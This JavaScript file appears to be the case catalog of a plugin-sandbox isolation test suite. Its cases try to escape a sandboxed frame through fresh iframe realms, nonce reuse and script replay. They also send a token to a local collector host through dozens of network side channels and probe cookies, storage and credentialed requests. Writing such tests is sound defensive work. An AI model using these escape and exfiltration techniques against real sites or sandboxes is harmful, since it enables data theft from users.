// The test catalog. Each case's `code` is serialised with toString() and runs inside the plugin frame
// (or the control frame). It uses helpers from the frame prelude in pages.mjs: TK, C, A, NONCE, U, sleep,
// note, send, add, tryv, loaded, CHILD, rtc, probeRealm. Node never calls these functions.
/* global SELF_SRC, TK, C, A, NONCE, U, sleep, note, send, add, tryv, loaded, CHILD, rtc, probeRealm */

const cases = [];
// def(question, id, label, code, { variants, shellCsp: [bools], hostdoc, kind, wait, settle, udp, tcp })
function def(q, id, label, code, o = {}) {
  cases.push({ q, id, label, code, ...o, variants: o.variants || ["full"], shellCsps: o.shellCsps || [true], hostdoc: o.hostdoc ?? false, kind: o.kind || "leak", udp: !!o.udp, tcp: !!o.tcp });
}

// ================= Q1: child frames and fresh realms (host document ON) =================
const Q1V = { variants: ["full", "noframe", "frames-open", "sandbox-only"], hostdoc: true, kind: "q1", udp: true, wait: 2600 };

def("Q1", "iframe-nosrc", "iframe, no src", async () => {
  const f = document.createElement("iframe"); document.body.appendChild(f); await sleep(50);
  note("child", await probeRealm(f.contentWindow, "nosrc"));
}, { ...Q1V, variants: [...Q1V.variants, "full-hash", "single-hash", "tt", "single-hash-tt"] });
def("Q1", "iframe-about-blank", "iframe src=about:blank", async () => {
  const f = document.createElement("iframe"); f.src = "about:blank"; const l = loaded(f); document.body.appendChild(f); note("load", await l);
  note("child", await probeRealm(f.contentWindow, "aboutblank"));
}, Q1V);
def("Q1", "iframe-srcdoc", "iframe srcdoc (with nonced child script)", async () => {
  const f = document.createElement("iframe"); f.srcdoc = "<p>x</p>" + CHILD("srcdoc"); const l = loaded(f); document.body.appendChild(f); note("load", await l);
  note("child", await probeRealm(f.contentWindow, "srcdoc"));
}, { ...Q1V, variants: [...Q1V.variants, "full-hash", "single-hash", "tt", "single-hash-tt"] });
def("Q1", "iframe-javascript-url", "iframe src=javascript: URL", async () => {
  const f = document.createElement("iframe"); f.src = "javascript:" + JSON.stringify("<p>js</p>" + CHILD("jsurl")); const l = loaded(f); document.body.appendChild(f); note("load", await l);
  note("child", await probeRealm(f.contentWindow, "jsurl"));
}, { ...Q1V, variants: [...Q1V.variants, "full-hash", "single-hash", "tt", "single-hash-tt"] });
def("Q1", "iframe-data-url", "iframe src=data:text/html", async () => {
  const f = document.createElement("iframe"); f.src = "data:text/html," + encodeURIComponent(CHILD("data")); const l = loaded(f); document.body.appendChild(f); note("load", await l);
  note("child", await probeRealm(f.contentWindow, "data"));
}, Q1V);
def("Q1", "iframe-blob-url", "iframe src=blob: URL", async () => {
  const u = URL.createObjectURL(new Blob([CHILD("blob")], { type: "text/html" }));
  const f = document.createElement("iframe"); f.src = u; const l = loaded(f); document.body.appendChild(f); note("load", await l);
  note("child", await probeRealm(f.contentWindow, "blob"));
}, Q1V);
def("Q1", "object-about-blank", "<object data=about:blank>", async () => {
  const o = document.createElement("object"); o.type = "text/html"; o.data = "about:blank"; const l = loaded(o); document.body.appendChild(o); note("load", await l);
  note("child", o.contentWindow ? await probeRealm(o.contentWindow, "objblank") : { none: "contentWindow null" });
}, Q1V);
def("Q1", "object-data-html", "<object data=data:text/html>", async () => {
  const o = document.createElement("object"); o.type = "text/html"; o.data = "data:text/html," + encodeURIComponent(CHILD("objdata")); const l = loaded(o); document.body.appendChild(o); note("load", await l);
  note("child", o.contentWindow ? await probeRealm(o.contentWindow, "objdata") : { none: "contentWindow null" });
}, Q1V);
def("Q1", "embed-data-html", "<embed src=data:text/html>", async () => {
  const n = window.length; const e = document.createElement("embed"); e.type = "text/html"; e.src = "data:text/html," + encodeURIComponent(CHILD("embed")); document.body.appendChild(e); await sleep(800);
  note("child", window.length > n ? await probeRealm(window[n], "embed") : { none: "no new window[" + n + "]" });
}, Q1V);
def("Q1", "innerhtml-window-index", "innerHTML <iframe>, reached as window[0]", async () => {
  add("<iframe></iframe>"); await sleep(50);
  note("child", window.length ? await probeRealm(window[0], "winidx") : { none: "window.length 0" });
}, Q1V);
def("Q1", "create-html-document", "document.implementation.createHTMLDocument", async () => {
  const d = document.implementation.createHTMLDocument("x");
  d.body.innerHTML = "<iframe></iframe>";
  note("child", { none: "defaultView " + (d.defaultView === null ? "null" : typeof d.defaultView), innerIframeWindow: String(d.querySelector("iframe").contentWindow) });
}, Q1V);
def("Q1", "domparser", "new DOMParser() document", async () => {
  const d = new DOMParser().parseFromString("<iframe></iframe><script>parent.postMessage(1,'*')</" + "script>", "text/html");
  note("child", { none: "defaultView " + (d.defaultView === null ? "null" : typeof d.defaultView), innerIframeWindow: String(d.querySelector("iframe").contentWindow) });
}, Q1V);
def("Q1", "window-open", "window.open('about:blank')", async () => {
  const w = window.open("about:blank");
  note("child", w ? await probeRealm(w, "winopen") : { none: "window.open returned null" });
}, Q1V);

// Code from strings, inside the plugin's own realm.
const Q1S = { variants: ["full", "full-hash"], hostdoc: true, kind: "probe" };
def("Q1", "str-eval", "eval('7') in plugin realm", async () => { note("result", tryv(() => eval("7"))); }, Q1S);
def("Q1", "str-function", "Function('return 7')() in plugin realm", async () => { note("result", tryv(() => Function("return 7")())); }, Q1S);
def("Q1", "str-settimeout", "setTimeout('code string')", async () => { tryv(() => setTimeout("window.__st = 7", 0)); await sleep(100); note("result", window.__st === 7 ? "ran" : "did not run"); }, Q1S);
def("Q1", "str-nonce-script", "inline <script> given the page nonce (read from currentScript.nonce)", async () => {
  note("nonceVisible", NONCE ? "yes (" + NONCE.length + " chars)" : "no");
  const s = document.createElement("script"); s.nonce = NONCE; s.textContent = "window.__ns = 7"; document.body.appendChild(s); await sleep(50);
  note("result", window.__ns === 7 ? "ran" : "did not run");
}, Q1S);


// Replay: the plugin copies its own (allowed) inline script into a srcdoc child, where the host document
// has not run. Tests whether hash-based CSP alone stops a fresh realm, and whether one combined
// hostdoc+plugin script (single-hash) or Trusted Types does.
const replayCode = (how) => `async () => {
  if (self.name === 'replay') {
    const o = { origin: String(self.origin), types: { RTCPeerConnection: typeof RTCPeerConnection }, fn: null };
    if (typeof RTCPeerConnection === 'function') o.rtc = await rtc(RTCPeerConnection, 'replay');
    top.postMessage({ __t: 1, tk: TK, from: 'child-replay', out: o }, '*');
    return;
  }
  note('selfSrcLength', SELF_SRC.length);
  const html = '<script nonce="' + NONCE + '">' + SELF_SRC + '</' + 'script>';
  const f = document.createElement('iframe'); f.name = 'replay';
  try { ${how} note('assign', 'ok'); } catch (e) { note('assign', 'threw ' + e.name); }
  document.body.appendChild(f); await sleep(2800);
}`;
const QR = { hostdoc: true, kind: "q1", udp: true, wait: 300 };
def("Q1", "replay-srcdoc", "replay own script into iframe.srcdoc", replayCode("f.srcdoc = html;"), { ...QR, variants: ["full", "full-hash", "single-hash", "tt", "single-hash-tt"] });
def("Q1", "replay-setattribute", "replay own script via setAttribute('srcdoc')", replayCode("f.setAttribute('srcdoc', html);"), { ...QR, variants: ["tt", "single-hash-tt"] });
def("Q1", "replay-attr-node", "replay own script via Attr node value", replayCode("const at = document.createAttribute('srcdoc'); at.value = html; f.setAttributeNode(at);"), { ...QR, variants: ["tt", "single-hash-tt"] });
def("Q1", "replay-innerhtml", "replay own script via innerHTML '<iframe srcdoc>'", replayCode("const d = document.createElement('div'); d.innerHTML = '<iframe name=replay srcdoc=\"' + html.replace(/&/g,'&amp;').replace(/\"/g,'&quot;') + '\"></iframe>'; document.body.appendChild(d);"), { ...QR, variants: ["single-hash", "single-hash-tt"] });

// ================= Q2: navigation =================
const Q2V = { variants: ["full"], shellCsps: [true, false], hostdoc: true, kind: "nav", settle: 1500 };
def("Q2", "nav-location-href", "location.href = collector", async () => { send(true); location.href = U("nav-href"); }, Q2V);
def("Q2", "nav-location-replace", "location.replace(collector)", async () => { send(true); location.replace(U("nav-replace")); }, Q2V);
def("Q2", "nav-a-click", "<a href=collector>.click()", async () => { send(true); const a = document.createElement("a"); a.href = U("nav-a"); document.body.appendChild(a); a.click(); }, Q2V);
def("Q2", "nav-a-target-top", "<a target=_top>.click()", async () => { send(true); const a = document.createElement("a"); a.href = U("nav-a-top"); a.target = "_top"; document.body.appendChild(a); a.click(); }, Q2V);
def("Q2", "nav-a-target-blank", "<a target=_blank>.click()", async () => { send(true); const a = document.createElement("a"); a.href = U("nav-a-blank"); a.target = "_blank"; document.body.appendChild(a); a.click(); }, Q2V);
const formCode = (method, s) => `async () => { send(true); const f = document.createElement('form'); f.method = '${method}'; f.action = C + '/hit'; f.innerHTML = '<input name=tk value=' + TK + '><input name=s value=${s}>'; document.body.appendChild(f); f.submit(); }`;
def("Q2", "nav-form-get", "<form method=GET>.submit()", formCode("GET", "nav-form-get"), { ...Q2V, variants: ["full", "no-form-action"] });
def("Q2", "nav-form-post", "<form method=POST>.submit()", formCode("POST", "nav-form-post"), { ...Q2V, variants: ["full", "no-form-action"] });
def("Q2", "nav-meta-refresh", "<meta http-equiv=refresh> inserted by script", async () => { send(true); const m = document.createElement("meta"); m.httpEquiv = "refresh"; m.content = "0;url=" + U("nav-meta"); document.head.appendChild(m); }, Q2V);
def("Q2", "nav-window-open", "window.open(collector)", async () => { const w = window.open(U("nav-open")); note("ret", String(w)); }, Q2V);
def("Q2", "nav-top-location", "top.location = collector", async () => { send(true); try { top.location = U("nav-top"); } catch (e) { out.errors.push(e.name + ": " + e.message); } }, Q2V);
def("Q2", "nav-parent-location-href", "parent.location.href = collector", async () => { send(true); try { parent.location.href = U("nav-parent"); } catch (e) { out.errors.push(e.name + ": " + e.message); } }, Q2V);
def("Q2", "nav-same-origin-nonplugin", "location.href = A/api/whoami (same origin, not the plugin route)", async () => { send(true); location.href = U("nav-whoami", "/api/whoami", A); }, { ...Q2V, kind: "nav-app" });
def("Q2", "nav-grandchild", "child about:blank iframe navigated to collector", async () => { const f = document.createElement("iframe"); document.body.appendChild(f); await sleep(50); try { f.contentWindow.location.href = U("nav-grandchild"); } catch (e) { out.errors.push(e.name); } }, { ...Q2V, variants: ["full", "frames-open"], wait: 1000 });

// ================= Q4: network side channels (host document OFF unless named) =================
const Q4 = { variants: ["full"], hostdoc: false, kind: "leak" };
def("Q4", "fetch", "fetch()", async () => { await fetch(U("fetch"), { mode: "no-cors" }).then(() => note("r", "resolved"), (e) => note("r", "threw " + e.name)); }, Q4);
def("Q4", "fetch-keepalive", "fetch(keepalive)", async () => { await fetch(U("fetch-ka"), { mode: "no-cors", keepalive: true }).then(() => note("r", "resolved"), (e) => note("r", "threw " + e.name)); }, Q4);
def("Q4", "fetchlater", "fetchLater()", async () => { if (typeof fetchLater !== "function") return note("na", "fetchLater not present"); try { fetchLater(U("fetchlater"), { activateAfter: 0 }); note("r", "called"); } catch (e) { note("r", "threw " + e.name); } }, { ...Q4, wait: 1000 });
def("Q4", "xhr", "XMLHttpRequest", async () => { await new Promise((r) => { const x = new XMLHttpRequest(); x.open("GET", U("xhr")); x.onloadend = r; x.send(); }); }, Q4);
def("Q4", "websocket", "WebSocket", async () => { const ws = new WebSocket("ws://127.0.0.1:4102/ws?tk=" + TK + "&s=ws"); ws.onerror = () => {}; await sleep(500); }, Q4);
def("Q4", "websocketstream", "WebSocketStream", async () => { if (typeof WebSocketStream !== "function") return note("na", "WebSocketStream not present"); try { new WebSocketStream("ws://127.0.0.1:4102/wss?tk=" + TK + "&s=wss"); } catch (e) { note("r", "threw " + e.name); } await sleep(500); }, Q4);
def("Q4", "eventsource", "EventSource", async () => { const e = new EventSource(U("sse", "/sse")); await sleep(500); e.close(); }, Q4);
def("Q4", "sendbeacon", "navigator.sendBeacon", async () => { note("ret", tryv(() => navigator.sendBeacon(U("beacon"), "data"))); }, { ...Q4, wait: 800 });
def("Q4", "img", "<img src>", async () => { add('<img src="' + U("img") + '">'); }, Q4);
def("Q4", "img-srcset", "<img srcset>", async () => { add('<img srcset="' + U("srcset") + ' 1x">'); }, Q4);
def("Q4", "picture-source", "<picture><source srcset>", async () => { add('<picture><source srcset="' + U("picture") + '"><img></picture>'); }, Q4);
def("Q4", "input-image", "<input type=image src>", async () => { add('<input type="image" src="' + U("inputimg") + '">'); }, Q4);
def("Q4", "video-poster", "<video poster>", async () => { add('<video poster="' + U("poster") + '"></video>'); }, Q4);
def("Q4", "audio", "<audio src>", async () => { add('<audio src="' + U("audio") + '" preload="auto"></audio>'); }, Q4);
def("Q4", "video", "<video src>", async () => { add('<video src="' + U("video") + '" preload="auto"></video>'); }, Q4);
def("Q4", "track", "<video><track src>", async () => { add('<video><track default kind="subtitles" src="' + U("track") + '"></video>'); }, Q4);
def("Q4", "css-inline-style", "CSS url() in style attribute", async () => { add('<div style="width:9px;height:9px;background-image:url(' + U("cssattr") + ')"></div>'); }, Q4);
def("Q4", "css-style-element", "CSS url() in <style>", async () => { add('<style>.bgx{width:9px;height:9px;background-image:url(' + U("cssel") + ')}</style><div class="bgx"></div>'); }, Q4);
def("Q4", "css-import", "@import in <style>", async () => { add("<style>@import url(" + U("import", "/i.css") + ");</style>"); }, Q4);
def("Q4", "css-font-face", "@font-face src url()", async () => { add("<style>@font-face{font-family:Lk;src:url(" + U("font") + ")} .fx{font-family:Lk}</style><span class=fx>x</span>"); }, Q4);
def("Q4", "css-om-insertrule", "CSSOM insertRule with url()", async () => { const s = document.createElement("style"); document.head.appendChild(s); s.sheet.insertRule(".om{background:url(" + U("cssom") + ")}"); add('<div class="om" style="width:9px;height:9px"></div>'); }, Q4);
const link = (rel, s, extra = "") => `async () => { const l = document.createElement('link'); l.rel = '${rel}'; ${extra} l.href = U('${s}'); document.head.appendChild(l); }`;
def("Q4", "link-stylesheet", "<link rel=stylesheet>", link("stylesheet", "link-css"), Q4);
def("Q4", "link-prefetch", "<link rel=prefetch>", link("prefetch", "link-prefetch"), { ...Q4, wait: 1000 });
def("Q4", "link-preload", "<link rel=preload as=image>", link("preload", "link-preload", "l.as = 'image';"), Q4);
def("Q4", "link-preload-fetch", "<link rel=preload as=fetch>", link("preload", "link-preload-fetch", "l.as = 'fetch'; l.crossOrigin = 'anonymous';"), Q4);
def("Q4", "link-modulepreload", "<link rel=modulepreload>", link("modulepreload", "link-modpre"), Q4);
def("Q4", "link-prerender", "<link rel=prerender>", link("prerender", "link-prerender"), { ...Q4, wait: 1000 });
def("Q4", "link-icon", "<link rel=icon>", link("icon", "link-icon"), { ...Q4, wait: 800 });
def("Q4", "link-manifest", "<link rel=manifest>", link("manifest", "link-manifest"), { ...Q4, wait: 800 });
def("Q4", "link-preconnect", "<link rel=preconnect> (TCP connection observed, no request)", async () => { const l = document.createElement("link"); l.rel = "preconnect"; l.href = "http://127.0.0.1:4102"; document.head.appendChild(l); }, { ...Q4, tcp: true, wait: 1000 });
def("Q4", "link-dns-prefetch", "<link rel=dns-prefetch> (TCP check only)", async () => { const l = document.createElement("link"); l.rel = "dns-prefetch"; l.href = "http://127.0.0.1:4102"; document.head.appendChild(l); }, { ...Q4, tcp: true, wait: 1000 });
def("Q4", "script-src", "<script src> without nonce", async () => { const s = document.createElement("script"); s.src = U("script", "/s.js"); document.head.appendChild(s); }, Q4);
def("Q4", "script-src-nonce", "<script src=collector> carrying the page nonce", async () => { const s = document.createElement("script"); s.nonce = NONCE; s.src = U("script-nonce", "/s.js"); document.head.appendChild(s); }, { ...Q4, variants: ["full", "full-hash", "single-hash"] });
def("Q4", "dynamic-import", "import() from the nonced inline script", async () => { await import(U("import", "/m.mjs")).then(() => note("r", "loaded"), (e) => note("r", "threw " + e.name)); }, { ...Q4, variants: ["full", "full-hash", "single-hash"] });
def("Q4", "a-ping", "<a ping> clicked (href=#)", async () => { const a = document.createElement("a"); a.href = "#x"; a.ping = U("ping"); document.body.appendChild(a); a.click(); }, { ...Q4, wait: 800 });
def("Q4", "svg-image", "<svg><image href>", async () => { add('<svg width="9" height="9"><image href="' + U("svgimg") + '" width="9" height="9"/></svg>'); }, Q4);
def("Q4", "svg-use", "<svg><use href=external>", async () => { add('<svg width="9" height="9"><use href="' + U("svguse", "/u.svg") + '#a"/></svg>'); }, Q4);
def("Q4", "speculation-prefetch", "speculation rules prefetch (nonced)", async () => { const s = document.createElement("script"); s.type = "speculationrules"; s.nonce = NONCE; s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [U("spec-prefetch")], eagerness: "immediate" }] }); document.head.appendChild(s); note("supports", typeof HTMLScriptElement.supports === "function" ? HTMLScriptElement.supports("speculationrules") : "n/a"); }, { ...Q4, variants: ["full", "full-hash"], wait: 1500 });
def("Q4", "speculation-prerender", "speculation rules prerender (nonced)", async () => { const s = document.createElement("script"); s.type = "speculationrules"; s.nonce = NONCE; s.textContent = JSON.stringify({ prerender: [{ source: "list", urls: [U("spec-prerender")], eagerness: "immediate" }] }); document.head.appendChild(s); }, { ...Q4, wait: 1500 });
def("Q4", "base-href", "<base href=collector> then relative <img> and <a>.click()", async () => { const b = document.createElement("base"); b.href = C + "/based/"; document.head.appendChild(b); note("baseURI", document.baseURI); add('<img src="rel-img?tk=' + TK + '&s=base-img">'); const a = document.createElement("a"); a.href = "rel-a?tk=" + TK + "&s=base-a"; note("aHref", a.href); }, Q4);
def("Q4", "iframe-src", "<iframe src=collector>", async () => { add('<iframe src="' + U("iframe") + '"></iframe>'); }, { ...Q4, wait: 800 });
def("Q4", "object-data", "<object data=collector>", async () => { add('<object data="' + U("object") + '"></object>'); }, { ...Q4, wait: 800 });
def("Q4", "embed-src", "<embed src=collector>", async () => { add('<embed src="' + U("embed") + '">'); }, { ...Q4, wait: 800 });
def("Q4", "worker-blob", "new Worker(blob:) that fetches", async () => { try { new Worker(URL.createObjectURL(new Blob(["fetch(" + JSON.stringify(U("worker")) + ",{mode:'no-cors'})"], { type: "text/javascript" }))); note("r", "constructed"); } catch (e) { note("r", "threw " + e.name); } }, { ...Q4, wait: 800 });
def("Q4", "sharedworker-blob", "new SharedWorker(blob:)", async () => { if (typeof SharedWorker !== "function") return note("na", "no SharedWorker"); try { new SharedWorker(URL.createObjectURL(new Blob(["fetch(" + JSON.stringify(U("sworker")) + ",{mode:'no-cors'})"], { type: "text/javascript" }))); note("r", "constructed"); } catch (e) { note("r", "threw " + e.name); } }, { ...Q4, wait: 800 });
def("Q4", "webrtc", "RTCPeerConnection, STUN+TURN at 127.0.0.1:4103/udp", async () => { note("rtc", typeof RTCPeerConnection === "function" ? await rtc(RTCPeerConnection, "rtc") : "RTCPeerConnection " + typeof RTCPeerConnection); }, { ...Q4, variants: ["full", "webrtc-block"], udp: true, wait: 300 });
def("Q4", "webtransport", "WebTransport to https://127.0.0.1:4103 (QUIC Initial over UDP)", async () => { if (typeof WebTransport !== "function") return note("na", "WebTransport not present"); try { const w = new WebTransport("https://127.0.0.1:4103/wt?tk=" + TK); w.closed.catch(() => {}); w.ready.catch((e) => note("ready", "rejected " + e.name)); note("r", "constructed"); } catch (e) { note("r", "threw " + e.name); } await sleep(1500); }, { ...Q4, udp: true, udpAny: true });

// Host document ON: try to get the deleted constructors back.
const Q4H = { variants: ["full"], hostdoc: true, kind: "leak", udp: true };
def("Q4", "hd-webrtc-plain", "[host doc] RTCPeerConnection in plugin realm", async () => { note("hostdoc", self.__hostdoc); note("rtc", typeof RTCPeerConnection === "function" ? await rtc(RTCPeerConnection, "hd-plain") : "RTCPeerConnection " + typeof RTCPeerConnection); }, Q4H);
def("Q4", "hd-webrtc-iframe", "[host doc] RTCPeerConnection from a no-src child iframe", async () => { const f = document.createElement("iframe"); document.body.appendChild(f); const PC = f.contentWindow.RTCPeerConnection; note("rtc", typeof PC === "function" ? await rtc(PC, "hd-iframe") : "child RTCPeerConnection " + typeof PC); }, { ...Q4H, variants: ["full", "webrtc-block"] });
def("Q4", "hd-webrtc-window-index", "[host doc] RTCPeerConnection via window[0] (innerHTML iframe)", async () => { add("<iframe></iframe>"); const PC = window[0] && window[0].RTCPeerConnection; note("rtc", typeof PC === "function" ? await rtc(PC, "hd-winidx") : "window[0].RTCPeerConnection " + typeof PC); }, Q4H);
def("Q4", "hd-webrtc-contentdocument", "[host doc] RTCPeerConnection via iframe.contentDocument.defaultView", async () => { const f = document.createElement("iframe"); document.body.appendChild(f); const PC = f.contentDocument.defaultView.RTCPeerConnection; note("rtc", typeof PC === "function" ? await rtc(PC, "hd-cdoc") : "missing"); }, Q4H);
def("Q4", "hd-webrtc-prototypes", "[host doc] look for RTCPeerConnection through other objects and prototypes", async () => {
  const found = [];
  const own = Object.getOwnPropertyNames(self).filter((n) => /rtc|peer/i.test(n));
  note("remainingGlobals", own);
  for (const n of ["webkitRTCPeerConnection", "mozRTCPeerConnection"]) if (typeof self[n] === "function") found.push(n);
  for (const n of own) { try { const p = self[n] && self[n].prototype; if (p && typeof p.createOffer === "function") found.push(n + " has createOffer"); } catch (e) {} }
  let o = self; while ((o = Object.getPrototypeOf(o))) { if (Object.getOwnPropertyNames(o).includes("RTCPeerConnection")) found.push("on prototype " + String(o)); }
  note("found", found);
  const PC = found.length && self[found[0].split(" ")[0]];
  if (typeof PC === "function") note("rtc", await rtc(PC, "hd-proto"));
}, Q4H);
def("Q4", "hd-globals-left", "[host doc] network-capable globals left after deletion", async () => {
  note("hostdoc", self.__hostdoc);
  note("left", Object.getOwnPropertyNames(self).filter((n) => /fetch|xmlhttp|socket|transport|eventsource|worker|rtc|beacon|request/i.test(n)).concat(typeof navigator.sendBeacon === "function" ? ["navigator.sendBeacon"] : []));
}, { ...Q4H, kind: "probe", udp: false });
def("Q4", "hd-fetch-iframe", "[host doc] fetch taken from a child iframe", async () => { const f = document.createElement("iframe"); document.body.appendChild(f); await f.contentWindow.fetch(U("hd-fetch-iframe"), { mode: "no-cors" }).then(() => note("r", "resolved"), (e) => note("r", "threw " + e.name)); }, { ...Q4H, udp: false, variants: ["full", "sandbox-only"] });
def("Q4", "hd-ws-iframe", "[host doc] WebSocket taken from a child iframe", async () => { const f = document.createElement("iframe"); document.body.appendChild(f); try { const ws = new f.contentWindow.WebSocket("ws://127.0.0.1:4102/ws?tk=" + TK + "&s=hd-ws"); ws.onerror = () => {}; } catch (e) { note("r", "threw " + e.name); } await sleep(500); }, { ...Q4H, udp: false });
def("Q4", "hd-document-open", "[host doc] document.open() then check globals", async () => { document.open(); document.write("<p>x</p>"); document.close(); note("afterOpen", { RTCPeerConnection: typeof self.RTCPeerConnection, fetch: typeof self.fetch }); }, { ...Q4H, kind: "probe", udp: false });

// ================= Q7: session =================
const Q7 = { variants: ["full"], hostdoc: true, kind: "probe" };
def("Q7", "storage-probe", "document.cookie, localStorage, sessionStorage, indexedDB, caches, parent.document", async () => {
  note("origin", String(self.origin));
  note("document.cookie", tryv(() => JSON.stringify(document.cookie)));
  note("localStorage", tryv(() => JSON.stringify(localStorage.getItem("secret"))));
  note("sessionStorage", tryv(() => typeof sessionStorage.length));
  note("indexedDB", await new Promise((r) => { try { const q = indexedDB.open("x"); q.onsuccess = () => r("opened"); q.onerror = () => r("error " + (q.error && q.error.name)); setTimeout(() => r("timeout"), 1000); } catch (e) { r("threw " + e.name); } }));
  note("caches", typeof caches === "undefined" ? "undefined" : await caches.open("x").then(() => "opened", (e) => "rejected " + e.name));
  note("parent.document", tryv(() => typeof parent.document));
  note("parent.localStorage", tryv(() => JSON.stringify(parent.localStorage.getItem("secret"))));
  note("top.location.href", tryv(() => top.location.href));
}, Q7);
const who = (cors, creds, s) => `async () => {
  const r = await fetch(A + '/api/whoami?tk=' + TK + '&s=${s}&cors=${cors}', { credentials: '${creds}' }).then(async (res) => 'status ' + res.status + ' body ' + (await res.text()), (e) => 'threw ' + e.name);
  note('result', r);
}`;
const Q7F = { ...Q7, hostdoc: false, kind: "whoami", variants: ["connect", "sandbox-only"] };
def("Q7", "whoami-include-nocors", "fetch(A/api/whoami, credentials:include), no CORS headers", who("none", "include", "who-nocors"), Q7F);
def("Q7", "whoami-include-cors-null", "fetch(..., credentials:include), ACAO: null + ACAC: true", who("null", "include", "who-null"), Q7F);
def("Q7", "whoami-include-cors-star", "fetch(..., credentials:include), ACAO: *", who("star", "include", "who-star"), Q7F);
def("Q7", "whoami-default-cors-null", "fetch(..., default credentials), ACAO: null", who("null", "same-origin", "who-default"), Q7F);
def("Q7", "whoami-img", "<img src=A/api/whoami> (no-cors subresource)", async () => { add('<img src="' + U("who-img", "/api/whoami", A) + '">'); }, { ...Q7, kind: "whoami", variants: ["sandbox-only", "full"] });
def("Q7", "whoami-navigation", "frame navigates itself to A/api/whoami", async () => { send(true); location.href = U("who-nav", "/api/whoami", A); }, { ...Q7, kind: "whoami", shellCsps: [true, false], settle: 1200 });

// ================= expand into tests =================
export const tests = [];
for (const c of cases) {
  for (const variant of c.variants) {
    for (const shellCsp of c.shellCsps) {
      const id = `${c.id}@${variant}${c.shellCsps.length > 1 ? (shellCsp ? "+shellcsp" : "+noshellcsp") : ""}`;
      tests.push({ ...c, caseId: c.id, id, variant, shellCsp, code: typeof c.code === "string" ? { toString: () => c.code } : c.code });
    }
  }
}
export const caseList = cases;
